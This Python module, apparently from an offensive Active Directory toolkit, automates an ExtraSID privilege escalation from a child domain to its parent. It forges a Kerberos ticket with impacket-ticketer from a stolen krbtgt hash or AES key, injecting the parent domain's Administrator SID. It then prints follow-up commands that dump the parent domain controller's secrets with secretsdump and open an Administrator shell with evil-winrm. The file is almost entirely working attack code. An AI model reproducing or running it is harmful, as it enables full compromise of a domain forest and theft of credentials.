# modules/extrasid.py

import os
import subprocess
import re
import shutil
from core.colors import red, green, yellow, blue
from core.helpers import save_loot

def is_valid_sid(sid):
    return bool(re.match(r"^S-\d-\d+(-\d+){1,}$", sid))

def run(session):
    print(blue("[*] Starting ExtraSID privilege escalation (child → parent)..."))

    child_domain = session.domain
    dc_ip = session.dc_ip
    username = session.username

    print(blue(f"[*] Session: {username}@{child_domain}"))

    parent_domain = input("[?] Enter parent domain (e.g., finance.corp): ").strip()
    parent_dc_fqdn = input("[?] Enter FQDN of the parent DC (e.g., dc01.finance.corp): ").strip()
    child_sid = input("[?] Enter Child Domain SID: ").strip()
    parent_sid = input("[?] Enter Parent Domain SID: ").strip()

    if not all([is_valid_sid(child_sid), is_valid_sid(parent_sid)]):
        print(red("[-] Invalid SID format(s)."))
        return

    if "." not in parent_domain or "." not in parent_dc_fqdn:
        print(red("[-] Invalid domain or DC FQDN format."))
        return

    print(blue("[*] Choose key type for krbtgt of child domain:"))
    print("  1) NT hash (RC4)")
    print("  2) AES256 key")
    key_choice = input("[?] Key type (1/2): ").strip()

    if key_choice == "1":
        key_flag = "-nthash"
        key_value = input("[?] Enter NT hash (32 hex chars): ").strip()
        if not re.fullmatch(r"[0-9a-fA-F]{32}", key_value):
            print(red("[-] NT hash must be 32 hex characters."))
            return
    elif key_choice == "2":
        key_flag = "-aesKey"
        key_value = input("[?] Enter AES256 key (64 hex chars): ").strip()
        if not re.fullmatch(r"[0-9a-fA-F]{64}", key_value):
            print(red("[-] AES256 key must be 64 hex characters."))
            return
    else:
        print(red("[-] Invalid key type selection."))
        return

    if not shutil.which("impacket-ticketer"):
        print(red("[-] 'impacket-ticketer' not found in PATH."))
        return

    tgt_path = f"loot/{username}_extratgt.ccache"
    tgt_base = tgt_path.replace(".ccache", "")

    # === Step 1: Forge TGT with ExtraSID
    tgt_cmd = [
        "impacket-ticketer",
        "-domain", child_domain,
        key_flag, key_value,
        "-domain-sid", child_sid,
        "-user-id", "500",
        "-groups", "512",
        "-extra-sid", f"{parent_sid}-500",
        username
    ]

    print(blue("[*] Creating TGT with ExtraSID..."))
    try:
        subprocess.run(tgt_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(red(f"[-] TGT creation failed:\n{e}"))
        return

    default_ccache = f"{username}.ccache"
    if os.path.exists(default_ccache):
        shutil.move(default_ccache, tgt_path)
        print(green(f"[+] TGT saved to loot: {tgt_path}"))
    else:
        print(red(f"[-] TGT file {default_ccache} was not created."))
        return

    # === Step 2: Print manual follow-up commands
    spn = f"CIFS/{parent_dc_fqdn}"
    st_name = f"{username}@{spn.replace('/', '_')}@{parent_domain.upper()}.ccache"
    st_path = f"loot/{st_name}"

    print()
    print(green("[+] ExtraSID attack completed successfully."))
    print(yellow("[*] Run the following commands manually to access the parent domain:\n"))

    print(yellow("# Set the ticket environment"))
    print(yellow(f"export KRB5CCNAME='{os.path.abspath(tgt_path)}'"))

    print(yellow("\n# Request a Service Ticket for CIFS (do NOT run automatically)"))
    print(yellow(f"impacket-getST -spn {spn} -k -no-pass {child_domain}/{username} '"))

    print(yellow("\n# Use the ST with these commands after getST:"))
    print(yellow(f"export KRB5CCNAME='{os.path.abspath(st_path)}'"))
    print(yellow(f"impacket-secretsdump -k -no-pass {parent_dc_fqdn}"))
    print(yellow(f"evil-winrm -k -no-pass -r {parent_dc_fqdn} -u Administrator -d {parent_domain.upper()}"))
    print()

    save_loot("extrasid.log", f"Child SID: {child_sid}\nParent SID: {parent_sid}\nSPN: {spn}\nTGT: {tgt_path}\nST: {st_path}")
